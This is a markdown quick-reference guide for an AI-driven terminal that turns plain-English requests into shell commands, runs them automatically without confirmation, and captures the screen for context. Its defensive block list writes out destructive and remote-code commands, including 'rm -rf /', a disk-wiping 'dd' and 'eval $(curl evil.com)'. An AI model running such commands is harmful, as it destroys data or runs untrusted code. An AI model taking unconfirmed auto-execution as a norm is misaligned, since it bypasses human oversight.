# AuraOS Terminal v3.0 — Quick Reference

## 🚀 Start Here

```bash
# Launch Terminal
python auraos_terminal_v3.py

# Or CLI mode
python auraos_terminal_v3.py --cli
```

## 💡 Main Features

### 1. AI Mode (Click ⚡)
- Input auto-prefilled with `ai- `
- Type your request in plain English
- **Auto-executes** (no confirmation!)
- Shows results with reasoning

### 2. Regular Shell
- Type commands normally
- Works like any terminal
- Output displayed immediately

### 3. Screen Context
- Captures last 5 minutes automatically
- AI understands visual state
- Prevents redundant actions
- Stored in `/tmp/auraos_screenshots/`

## 📋 Common Tasks

### Install Dependencies
```
⚡ AI → ai- install python dependencies
```
✓ Detects environment and runs `pip install -r requirements.txt`

### Create Backup
```
⚡ AI → ai- backup important documents
```
✓ Creates timestamped archive automatically

### Check System Status
```
⚡ AI → ai- show system health
```
✓ Runs health checks and shows results

### Find Large Files
```
⚡ AI → ai- find files larger than 1GB
```
✓ Searches and lists with sizes

## ⌨️ Keyboard Shortcuts

| Key | Action |
|-----|--------|
| **Enter** | Execute command |
| **↑** | Previous command |
| **↓** | Next command |
| **Esc** | Clear input |
| **Tab** | (Reserved for future) |

## 🎨 Color Guide

| Color | Meaning |
|-------|---------|
| 🔵 Blue | System output |
| 🟢 Green | Success (✓) |
| 🔴 Red | Error (✗) |
| 🟡 Yellow | Warning (⚠) |
| ⚪ Gray | Regular output |
| 🟡 Amber | AI mode (⚡) |

## 🛡️ Safety Rules

### ✅ Auto-Executes
```
pip install package
apt-get update
mkdir ~/backup
tar -czf archive.tgz files/
```

### ❌ Blocked
```
rm -rf /
dd if=/dev/zero of=/dev/sda
eval $(curl evil.com)
chmod 000 /etc
```

If blocked: **See suggestion message**

## 📊 Pipeline Flow

```
Click ⚡ AI
    ↓
Type request
    ↓
✓ Screen capture
✓ Script generation
✓ Safety check
↓ Auto-execute (if safe)
✓ Validation
↓ Show results
```

**Total time**: Usually 2-5 seconds

## 📁 Important Locations

```
Config:       ~/.auraos/config.json
Screenshots:  /tmp/auraos_screenshots/
Database:     /tmp/auraos_screen_context.db
Logs:         /tmp/auraos_terminal_v3.log
Daemon:       ~/ai-os/auraos_daemon/main.py
Terminal:     ~/bin/auraos-terminal
```

## 🔍 Troubleshooting

### AI not working?
```bash
curl http://localhost:5000/health
```

### Missing daemon?
```bash
cd ~/ai-os/auraos_daemon
python main.py &
```

### Check logs
```bash
tail -f /tmp/auraos_terminal_v3.log
```

## 🎯 Examples

### Example 1: Install & Run Tests
```
ai- install python dependencies and run tests
```

Result:
```
✓ Screen Capture: Success
✓ Script Generation: pip install -r requirements.txt && pytest
✓ Safety Validation: Safe
⟳ Executing...
✓ All tests passed (145 passed, 2 skipped)
```

### Example 2: Create Backup
```
ai- backup all source code
```

Result:
```
✓ Identifying source directories...
✓ Creating archive...
✓ Archive saved to: ~/backups/code_2025-11-10.tgz (234 MB)
✓ Verification: Archive integrity OK
```

### Example 3: Find & Analyze
```
ai- find large log files older than 30 days
```

Result:
```
✓ Searching for old log files...
  /var/log/syslog (2.5 GB, 45 days old)
  /var/log/apache2/access.log (1.8 GB, 32 days old)
✓ Total space: 4.3 GB
Suggestion: Archive to /mnt/storage/ to free space
```

## 🔐 Privacy & Security

- ✓ All operations logged
- ✓ Logs stored locally
- ✓ Screenshots cleared automatically
- ✓ No cloud transmission
- ✓ No tracking

## 📈 Performance

- **Memory**: ~150 MB
- **Disk**: ~500 MB max (auto-rotating)
- **Startup**: < 1 second
- **Avg task**: 2-5 seconds
- **Max task**: 5 minutes (configurable)

## 🤝 Integration

Works seamlessly with:
- ✓ Existing `./auraos.sh` commands
- ✓ Daemon plugins (vm, selenium, window manager)
- ✓ Decision engine routing
- ✓ Plugin infrastructure

## 🚦 Status Indicators

| Indicator | Meaning |
|-----------|---------|
| ✓ | Success |
| ✗ | Failed |
| ⚠ | Warning |
| ⟳ | Processing |
| ⚡ | AI mode |
| → | Ready for input |

## 💬 Commands You Can Try

```
ai- install python packages
ai- create backup of downloads
ai- show disk usage
ai- find files modified today
ai- list processes using high CPU
ai- check system temperature
ai- restart services
ai- update system packages
ai- analyze log files
ai- organize downloads folder
```

## 🎓 Learning Path

1. **Start Simple**: Use AI for single tasks
   - `ai- check system status`
   
2. **Get Comfortable**: Try multi-step tasks
   - `ai- install deps and run tests`
   
3. **Advanced**: Complex automation
   - `ai- backup, analyze logs, and generate report`

4. **Customize**: Adjust safety rules for your needs
   - Edit `core/ai_handler.py`

## 📞 Help Commands

```bash
help       # In-terminal help
history    # See command history
status     # System status
health     # Full health check
exit       # Close terminal
```

## 🔄 Recent Updates (v3.0)

- ✨ AI button for quick access
- ⚡ Auto-execution (no confirmation)
- 🖼️ Screen context capture
- 📊 Detailed execution pipeline
- 🛡️ Multi-layer safety validation
- 📈 Better feedback and reporting
- 🔌 Full daemon integration
- 📝 Comprehensive logging

## 🎯 Next Steps

1. Launch: `python auraos_terminal_v3.py`
2. Click: **⚡ AI** button
3. Try: `ai- install python dependencies`
4. Observe: Full execution pipeline
5. Explore: Check menu for more options

## 📚 Full Documentation

See detailed docs:
- **Architecture**: `TERMINAL_V3_ARCHITECTURE.md`
- **Setup**: `TERMINAL_V3_SETUP.md`
- **Daemon**: `README.md` (in auraos_daemon)

---

**Happy automating! 🚀**

Tip: Start with simple tasks to understand the workflow, then gradually use more complex requests as you gain confidence.
